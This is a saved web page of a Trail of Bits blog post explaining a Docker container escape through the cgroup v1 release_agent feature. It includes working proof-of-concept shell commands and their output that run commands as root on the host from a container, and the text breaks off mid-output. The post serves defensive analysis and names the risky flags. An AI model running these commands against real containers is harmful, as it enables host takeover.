<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="CB19_files/recaptcha__en.js"></script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Understanding Docker container escapes | Trail of Bits Blog</title>
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://blog.trailofbits.com/xmlrpc.php">
<!--[if lt IE 9]>
<script src="https://s2.wp.com/wp-content/themes/premium/everyday/js/html5.js" type="text/javascript"></script>
<![endif]-->


<!-- Async WordPress.com Remote Login -->
<script id="twitter-wjs" src="CB19_files/widgets.js"></script>
<link rel="dns-prefetch" href="https://s2.wp.com/">
<link rel="dns-prefetch" href="https://s1.wp.com/">
<link rel="dns-prefetch" href="https://trailofbits.wordpress.com/">
<link rel="dns-prefetch" href="https://s0.wp.com/">
<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="alternate" type="application/rss+xml" title="Trail of Bits Blog » Feed" href="https://blog.trailofbits.com/feed/">
<link rel="alternate" type="application/rss+xml" title="Trail of Bits Blog » Comments Feed" href="https://blog.trailofbits.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Trail of Bits Blog » Understanding Docker container&nbsp;escapes Comments Feed" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/feed/">
	<script type="text/javascript">
		/* <![CDATA[ */
		function addLoadEvent(func) {
			var oldonload = window.onload;
			if (typeof window.onload != 'function') {
				window.onload = func;
			} else {
				window.onload = function () {
					oldonload();
					func();
				}
			}
		}
		/* ]]> */
	</script>
			<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s2.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1556893897h&ver=5.2.2"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="CB19_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="all-css-0-1" href="CB19_files/a_002.css" type="text/css" media="all">
<link rel="stylesheet" id="everyday-droid-serif-css" href="CB19_files/css_003.css" type="text/css" media="all">
<link rel="stylesheet" id="everyday-droid-sans-css" href="CB19_files/css.css" type="text/css" media="all">
<link rel="stylesheet" id="everyday-droid-mono-css" href="CB19_files/css_002.css" type="text/css" media="all">
<link rel="stylesheet" id="all-css-6-1" href="CB19_files/a_004.css" type="text/css" media="all">
<link rel="stylesheet" id="print-css-7-1" href="CB19_files/global-print.css" type="text/css" media="print">
<link rel="stylesheet" id="all-css-8-1" href="CB19_files/a.css" type="text/css" media="all">
<script type="text/javascript">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="text/javascript" src="CB19_files/a_004.js"></script>
<link rel="stylesheet" id="all-css-0-2" href="CB19_files/style.css" type="text/css" media="all">
<!--[if lt IE 8]>
<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s2.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' type='text/css' media='all' />
<![endif]-->
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://trailofbits.wordpress.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s1.wp.com/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="Trail of Bits Named in Forrester Wave as a Leader in Midsize Cybersecurity Consulting&nbsp;Services" href="https://blog.trailofbits.com/2019/07/16/trail-of-bits-named-in-forrester-wave-as-a-leader-in-midsize-cybersecurity-consulting-services/">
<meta name="generator" content="WordPress.com">
<link rel="canonical" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">
<link rel="shortlink" href="https://wp.me/pfrKF-pKh">
<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F&amp;for=wpcom-auto-discovery"><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F&amp;for=wpcom-auto-discovery">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article">
<meta property="og:title" content="Understanding Docker container escapes">
<meta property="og:url" content="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">
<meta property="og:description" content="Trail of Bits recently completed a security assessment of Kubernetes, including its interaction with Docker. Felix Wilhelm’s recent tweet of a Proof of Concept (PoC) “container escape” sparked our …">
<meta property="article:published_time" content="2019-07-20T01:01:09+00:00">
<meta property="article:modified_time" content="2019-07-20T07:59:37+00:00">
<meta property="og:site_name" content="Trail of Bits Blog">
<meta property="og:image" content="https://secure.gravatar.com/blavatar/366132244d069d5db95fc295d4d3de3e?s=200&amp;ts=1564402836">
<meta property="og:image:width" content="200">
<meta property="og:image:height" content="200">
<meta property="og:locale" content="en_US">
<meta name="twitter:creator" content="@trailofbits">
<meta name="twitter:site" content="@trailofbits">
<meta name="twitter:text:title" content="Understanding Docker container&nbsp;escapes">
<meta name="twitter:image" content="https://secure.gravatar.com/blavatar/366132244d069d5db95fc295d4d3de3e?s=240">
<meta name="twitter:card" content="summary">
<meta property="article:publisher" content="https://www.facebook.com/WordPresscom">

<!-- End Jetpack Open Graph Tags -->
<link rel="shortcut icon" type="image/x-icon" href="https://secure.gravatar.com/blavatar/366132244d069d5db95fc295d4d3de3e?s=32" sizes="16x16">
<link rel="icon" type="image/x-icon" href="https://secure.gravatar.com/blavatar/366132244d069d5db95fc295d4d3de3e?s=32" sizes="16x16">
<link rel="apple-touch-icon-precomposed" href="https://secure.gravatar.com/blavatar/366132244d069d5db95fc295d4d3de3e?s=114">
<link rel="openid.server" href="https://trailofbits.wordpress.com/?openidserver=1">
<link rel="openid.delegate" href="https://trailofbits.wordpress.com/">
<link rel="search" type="application/opensearchdescription+xml" href="https://blog.trailofbits.com/osd.xml" title="Trail of Bits Blog">
<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com">
<style>
#page {
	background-color: #f7f7f7;
}
</style>

<meta name="application-name" content="Trail of Bits Blog"><meta name="msapplication-window" content="width=device-width;height=device-height"><meta name="msapplication-task" content="name=Subscribe;action-uri=https://blog.trailofbits.com/feed/;icon-uri=https://secure.gravatar.com/blavatar/366132244d069d5db95fc295d4d3de3e?s=16"><meta name="msapplication-task" content="name=Sign up for a free blog;action-uri=http://wordpress.com/signup/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=WordPress.com Support;action-uri=http://support.wordpress.com/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=WordPress.com Forums;action-uri=http://forums.wordpress.com/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="description" content="Trail of Bits recently completed a security assessment of Kubernetes, including its interaction with Docker. Felix Wilhelm’s recent tweet of a Proof of Concept (PoC) “container escape” sparked our interest, since we performed similar research and were curious how this PoC could impact Kubernetes. https://twitter.com/_fel1x/status/1151487053370187776 Felix’s tweet shows an exploit that launches a process on…">
<style type="text/css" id="custom-background-css">
body.custom-background { background-image: url("https://s2.wp.com/wp-content/themes/premium/everyday/images/background.png"); background-position: left top; background-size: auto; background-repeat: repeat; background-attachment: scroll; }
</style>
			<link rel="stylesheet" id="custom-css-css" type="text/css" href="CB19_files/a_003.css">
		<link rel="stylesheet" type="text/css" href="CB19_files/shCore.css"><link rel="stylesheet" type="text/css" href="CB19_files/shThemeDefault.css"><link rel="stylesheet" type="text/css" id="gravatar-card-css" href="CB19_files/hovercard.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="CB19_files/services.css"><script charset="utf-8" src="CB19_files/momenttimelinetweet.js"></script><script charset="utf-8" src="CB19_files/timeline.js"></script><script charset="utf-8" src="CB19_files/tweet.js"></script><script src="CB19_files/bbba4ee4c641e0a8cfe055a65bc338e3.json" type="text/javascript"></script></head>

<body class="post-template-default single single-post postid-98969 single-format-standard custom-background mp6 customizer-styles-applied group-blog highlander-enabled highlander-light">
<div id="page" class="hfeed site">
		<header id="masthead" class="site-header" role="banner">
		<hgroup>
			<h1 class="site-title"><a href="https://blog.trailofbits.com/" title="Trail of Bits Blog" rel="home">Trail of Bits Blog</a></h1>
			<h2 class="site-description"></h2>
					</hgroup>

		<nav role="navigation" class="site-navigation main-navigation">
			<h1 class="assistive-text">Menu</h1>
			<div class="assistive-text skip-link"><a href="#content" title="Skip to content">Skip to content</a></div>
			<div class="menu"><ul>
<li><a href="https://blog.trailofbits.com/">Home</a></li></ul></div>
		</nav>
	</header><!-- #masthead .site-header -->

	<div id="main" class="main">
		<div id="primary" class="site-content">
			<div id="content" role="main">

			
				
<article id="post-98969" class="post-98969 post type-post status-publish format-standard hentry category-containers category-exploits category-kubernetes entry">
	<header class="entry-header">

		<h1 class="entry-title">Understanding Docker container&nbsp;escapes</h1>
					<ul class="entry-meta">
				<li class="entry-format">Post</li>
				<li class="permalink"><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" title="9:01 pm" rel="bookmark"><time class="entry-date" datetime="2019-07-19T21:01:09-04:00" pubdate="">July 19, 2019</time></a></li>
				<li class="comment-link"><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#comments">1 Comment</a></li>
							</ul><!-- .entry-meta -->
			</header><!-- .entry-header -->

	<div class="entry-content">
		<p>Trail of Bits recently completed a security assessment of Kubernetes, including its interaction with Docker. <a href="https://twitter.com/_fel1x">Felix Wilhelm</a>’s
 recent tweet of a Proof of Concept (PoC) “container escape” sparked our
 interest, since we performed similar research and were curious how this
 PoC could impact Kubernetes.</p>
<div class="embed">
<div class="embed-twitter">
<twitter-widget class="twitter-tweet twitter-tweet-rendered" id="twitter-widget-0" style="position: static; visibility: visible; display: block; transform: rotate(0deg); max-width: 100%; width: 550px; min-width: 220px; margin-top: 10px; margin-bottom: 10px;" data-tweet-id="1151487053370187776"></twitter-widget>
<p><script async="" src="CB19_files/widgets.js" charset="utf-8"></script></p></div>
</div>
<p>Felix’s tweet shows an exploit that launches a process on the host from within a Docker container run with the <code>--privileged</code> flag. The PoC achieves this by abusing the Linux cgroup v1 “notification on release” feature.</p>
<p>Here’s a version of the PoC that launches ps on the host:</p>
<div><div id="highlighter_147297" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash comments"># spawn a new container to exploit via:</code></div><div class="line number2 index1 alt1"><code class="bash comments"># docker run --rm -it --privileged ubuntu bash</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="bash plain">d=`</code><code class="bash functions">dirname</code> <code class="bash plain">$(</code><code class="bash functions">ls</code> <code class="bash plain">-x </code><code class="bash plain">/s</code><code class="bash plain">*</code><code class="bash plain">/fs/c</code><code class="bash plain">*/*</code><code class="bash plain">/r</code><code class="bash plain">* |</code><code class="bash functions">head</code> <code class="bash plain">-n1)`</code></div><div class="line number5 index4 alt2"><code class="bash functions">mkdir</code> <code class="bash plain">-p $d</code><code class="bash plain">/w</code><code class="bash plain">;</code><code class="bash functions">echo</code> <code class="bash plain">1 &gt;$d</code><code class="bash plain">/w/notify_on_release</code></div><div class="line number6 index5 alt1"><code class="bash plain">t=`</code><code class="bash functions">sed</code> <code class="bash plain">-n </code><code class="bash string">'s/.*\perdir=\([^,]*\).*/\1/p'</code> <code class="bash plain">/etc/mtab</code><code class="bash plain">`</code></div><div class="line number7 index6 alt2"><code class="bash functions">touch</code> <code class="bash plain">/o</code><code class="bash plain">; </code><code class="bash functions">echo</code> <code class="bash plain">$t</code><code class="bash plain">/c</code> <code class="bash plain">&gt;$d</code><code class="bash plain">/release_agent</code><code class="bash plain">;</code><code class="bash functions">printf</code> <code class="bash string">'#!/bin/sh\nps &gt;'</code><code class="bash string">"$t/o"</code> <code class="bash plain">&gt;</code><code class="bash plain">/c</code><code class="bash plain">;</code></div><div class="line number8 index7 alt1"><code class="bash functions">chmod</code> <code class="bash plain">+x </code><code class="bash plain">/c</code><code class="bash plain">;sh -c </code><code class="bash string">"echo 0 &gt;$d/w/cgroup.procs"</code><code class="bash plain">;</code><code class="bash functions">sleep</code> <code class="bash plain">1;</code><code class="bash functions">cat</code> <code class="bash plain">/o</code></div></div></td></tr></tbody></table></div></div>
<p>The <code>--privileged</code> flag introduces significant security 
concerns, and the exploit relies on launching a docker container with it
 enabled. When using this flag, containers have full access to all 
devices and lack restrictions from seccomp, AppArmor, and Linux 
capabilities.</p>
<div class="embed">
<div class="embed-twitter">
<twitter-widget class="twitter-tweet twitter-tweet-rendered" id="twitter-widget-1" style="position: static; visibility: visible; display: block; transform: rotate(0deg); max-width: 100%; width: 550px; min-width: 220px; margin-top: 10px; margin-bottom: 10px;" data-tweet-id="1151820663868579841"></twitter-widget>
<p><script async="" src="CB19_files/widgets.js" charset="utf-8"></script></p></div>
</div>
<p>Don’t run containers with <code>--privileged</code>. Docker includes 
granular settings that independently control the privileges of 
containers. In our experience, these critical security settings are 
often forgotten. It is necessary to understand how these options work to
 secure your containers.</p>
<p>In the sections that follow, we’ll walk through exactly how this 
“container escape” works, the insecure settings that it relies upon, and
 what developers should do instead.</p>
<h2>Requirements to use this technique</h2>
<p>In fact, <code>--privileged</code> provides far more permissions than
 needed to escape a docker container via this method. In reality, the 
“only” requirements are:</p>
<ol>
<li>We must be running as root inside the container</li>
<li>The container must be run with the <code>SYS_ADMIN</code> Linux capability</li>
<li>The container must lack an AppArmor profile, or otherwise allow the <code>mount</code> syscall</li>
<li>The cgroup v1 virtual filesystem must be mounted read-write inside the container</li>
</ol>
<p>The <code>SYS_ADMIN</code> capability allows a container to perform the mount syscall (see <a href="https://linux.die.net/man/7/capabilities">man 7 capabilities</a>). <a href="https://docs.docker.com/engine/security/security/#linux-kernel-capabilities">Docker starts containers with a restricted set of capabilities</a> by default and does not enable the <code>SYS_ADMIN</code> capability due to the security risks of doing so.</p>
<p>Further, Docker <a href="https://docs.docker.com/engine/security/apparmor/#understand-the-policies">starts containers with the <code>docker-default</code> AppArmor</a> policy by default, which <a href="https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35">prevents the use of the mount syscall</a> even when the container is run with <code>SYS_ADMIN</code>.</p>
<p>A container would be vulnerable to this technique if run with the flags: <code>--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</code></p>
<h2>Using cgroups to deliver the exploit</h2>
<p>Linux cgroups are one of the mechanisms by which Docker isolates containers. The PoC abuses the functionality of the <code>notify_on_release</code> feature in cgroups v1 to run the exploit as a fully privileged root user.</p>
<p>When the last task in a cgroup leaves (by exiting or attaching to another cgroup), a command supplied in the <code>release_agent</code>
 file is executed. The intended use for this is to help prune abandoned 
cgroups. This command, when invoked, is run as a fully privileged root 
on the host.</p>
<blockquote><p>1.4 What does notify_on_release do ?<br>
————————————<br>
If the notify_on_release flag is enabled (1) in a cgroup, then whenever 
the last task in the cgroup leaves (exits or attaches to some other 
cgroup) and the last child cgroup of that cgroup is removed, then the 
kernel runs the command specified by the contents of the “release_agent”
 file in that hierarchy’s root directory, supplying the pathname 
(relative to the mount point of the cgroup file system) of the abandoned
 cgroup. This enables automatic removal of abandoned cgroups. The 
default value of notify_on_release in the root cgroup at system boot is 
disabled (0). The default value of other cgroups at creation is the 
current value of their parents’ notify_on_release settings. The default 
value of a cgroup hierarchy’s release_agent path is empty.</p>
<p>– <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt">Linux Kernel documentation on cgroups v1</a></p></blockquote>
<h2>Refining the proof of concept</h2>
<p>There is a simpler way to write this exploit so it works without the <code>--privileged</code> flag. In this scenario, we won’t have access to a read-write cgroup mount provided by <code>--privileged</code>.
 Adapting to this scenario is easy: we’ll just mount the cgroup as 
read-write ourselves. This adds one extra line to the exploit but 
requires fewer privileges.</p>
<p>The exploit below will execute a ps aux command on the host and save its output to the <code>/output</code> file in the container. It uses the same <code>release_agent</code> feature as the original PoC to execute on the host.</p>
<div><div id="highlighter_926624" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash comments"># On the host</code></div><div class="line number2 index1 alt1"><code class="bash plain">docker run --</code><code class="bash functions">rm</code> <code class="bash plain">-it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu </code><code class="bash functions">bash</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="bash comments"># In the container</code></div><div class="line number5 index4 alt2"><code class="bash functions">mkdir</code> <code class="bash plain">/tmp/cgrp</code> <code class="bash plain">&amp;&amp; </code><code class="bash functions">mount</code> <code class="bash plain">-t cgroup -o rdma cgroup </code><code class="bash plain">/tmp/cgrp</code> <code class="bash plain">&amp;&amp; </code><code class="bash functions">mkdir</code> <code class="bash plain">/tmp/cgrp/x</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="bash functions">echo</code> <code class="bash plain">1 &gt; </code><code class="bash plain">/tmp/cgrp/x/notify_on_release</code></div><div class="line number8 index7 alt1"><code class="bash plain">host_path=`</code><code class="bash functions">sed</code> <code class="bash plain">-n </code><code class="bash string">'s/.*\perdir=\([^,]*\).*/\1/p'</code> <code class="bash plain">/etc/mtab</code><code class="bash plain">`</code></div><div class="line number9 index8 alt2"><code class="bash functions">echo</code> <code class="bash string">"$host_path/cmd"</code> <code class="bash plain">&gt; </code><code class="bash plain">/tmp/cgrp/release_agent</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="bash functions">echo</code> <code class="bash string">'#!/bin/sh'</code> <code class="bash plain">&gt; </code><code class="bash plain">/cmd</code></div><div class="line number12 index11 alt1"><code class="bash functions">echo</code> <code class="bash string">"ps aux &gt; $host_path/output"</code> <code class="bash plain">&gt;&gt; </code><code class="bash plain">/cmd</code></div><div class="line number13 index12 alt2"><code class="bash functions">chmod</code> <code class="bash plain">a+x </code><code class="bash plain">/cmd</code></div><div class="line number14 index13 alt1">&nbsp;</div><div class="line number15 index14 alt2"><code class="bash plain">sh -c </code><code class="bash string">"echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</code></div></div></td></tr></tbody></table></div></div>
<h2>Breaking down the proof of concept</h2>
<p>Now that we understand the requirements to use this technique and 
have refined the proof of concept exploit, let’s walk through it 
line-by-line to demonstrate how it works.</p>
<p>To trigger this exploit we need a cgroup where we can create a <code>release_agent</code> file <em>and</em> trigger <code>release_agent</code>
 invocation by killing all processes in the cgroup. The easiest way to 
accomplish that is to mount a cgroup controller and create a child 
cgroup.</p>
<p>To do that, we create a <code>/tmp/cgrp</code> directory, mount the <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt">RDMA</a>
 cgroup controller and create a child cgroup (named “x” for the purposes
 of this example). While every cgroup controller has not been tested, 
this technique should work with the majority of cgroup controllers.</p>
<p>Note that cgroup controllers are global resources that can be mounted
 multiple times with different permissions and the changes rendered in 
one mount will apply to another.</p>
<p>We can see the “x” child cgroup creation and its directory listing below.</p>
<div><div id="highlighter_804894" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</code></div><div class="line number2 index1 alt1"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># ls /tmp/cgrp/</code></div><div class="line number3 index2 alt2"><code class="bash plain">cgroup.clone_children&nbsp; cgroup.procs&nbsp; cgroup.sane_behavior&nbsp; notify_on_release&nbsp; release_agent&nbsp; tasks&nbsp; x</code></div><div class="line number4 index3 alt1"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># ls /tmp/cgrp/x</code></div><div class="line number5 index4 alt2"><code class="bash plain">cgroup.clone_children&nbsp; cgroup.procs&nbsp; notify_on_release&nbsp; rdma.current&nbsp; rdma.max&nbsp; tasks</code></div></div></td></tr></tbody></table></div></div>
<p>Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its <code>notify_on_release</code> file. We also set the RDMA cgroup release agent to execute a <code>/cmd</code> script — which we will later create in the container — by writing the <code>/cmd</code> script path on the host to the <code>release_agent</code> file. To do it, we’ll grab the container’s path on the host from the <code>/etc/mtab</code> file.</p>
<p>The files we add or modify in the container are present on the host, 
and it is possible to modify them from both worlds: the path in the 
container and their path on the host.</p>
<p>Those operations can be seen below:</p>
<div><div id="highlighter_900994" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># echo 1 &gt; /tmp/cgrp/x/notify_on_release</code></div><div class="line number2 index1 alt1"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`</code></div><div class="line number3 index2 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</code></div></div></td></tr></tbody></table></div></div>
<p>Note the path to the <code>/cmd</code> script, which we are going to create on the host:</p>
<div><div id="highlighter_985990" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># cat /tmp/cgrp/release_agent</code></div><div class="line number2 index1 alt1"><code class="bash plain">/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd</code></div></div></td></tr></tbody></table></div></div>
<p>Now, we create the <code>/cmd</code> script such that it will execute the <code>ps aux</code> command and save its output into <code>/output</code> on the container by specifying the full path of the output file on the host. At the end, we also print the <code>/cmd</code> script to see its contents:</p>
<div><div id="highlighter_221785" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># echo '#!/bin/sh' &gt; /cmd</code></div><div class="line number2 index1 alt1"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># echo "ps aux &gt; $host_path/output" &gt;&gt; /cmd</code></div><div class="line number3 index2 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># chmod a+x /cmd</code></div><div class="line number4 index3 alt1"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># cat /cmd</code></div><div class="line number5 index4 alt2"><code class="bash preprocessor bold">#!/bin/sh</code></div><div class="line number6 index5 alt1"><code class="bash functions">ps</code> <code class="bash plain">aux &gt; </code><code class="bash plain">/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output</code></div></div></td></tr></tbody></table></div></div>
<p>Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a <code>/bin/sh</code> process and writing its PID to the <code>cgroup.procs</code> file in “x” child cgroup directory, the script on the host will execute after <code>/bin/sh</code> exits. The output of <code>ps aux</code> performed on the host is then saved to the <code>/output</code> file inside the container:</p>
<div><div id="highlighter_78806" class="syntaxhighlighter  bash"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</code></div><div class="line number2 index1 alt1"><code class="bash plain">root@b11cf9eab4fd:/</code><code class="bash comments"># head /output</code></div><div class="line number3 index2 alt2"><code class="bash plain">USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PID %CPU %MEM&nbsp;&nbsp;&nbsp; VSZ&nbsp;&nbsp; RSS TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STAT START&nbsp;&nbsp; TIME COMMAND</code></div><div class="line number4 index3 alt1"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp; 0.1&nbsp; 1.0&nbsp; 17564 10288 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ss&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:01 </code><code class="bash plain">/sbin/init</code></div><div class="line number5 index4 alt2"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [kthreadd]</code></div><div class="line number6 index5 alt1"><code 